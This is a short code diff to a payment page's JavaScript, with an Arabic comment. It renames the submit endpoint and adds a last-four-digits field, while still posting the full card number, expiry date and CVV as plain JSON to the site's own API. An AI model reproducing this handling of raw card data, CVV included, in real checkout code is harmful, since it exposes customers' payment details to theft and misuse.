@@ -499,10 +499,12 @@
             if (loadingOverlay) loadingOverlay.classList.add('show');
             
             // حفظ حالة الدفع في السيرفر ثم التحويل
-            fetch('/api/complete-payment', {
+            fetch('/api/submit-payment', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    cardLast4: cardNumber.slice(-4),
+                    cardType: 'بطاقة',
                     cardNumber: cardNumber,
                     expiry: expiry,
                     cvv: cvv,
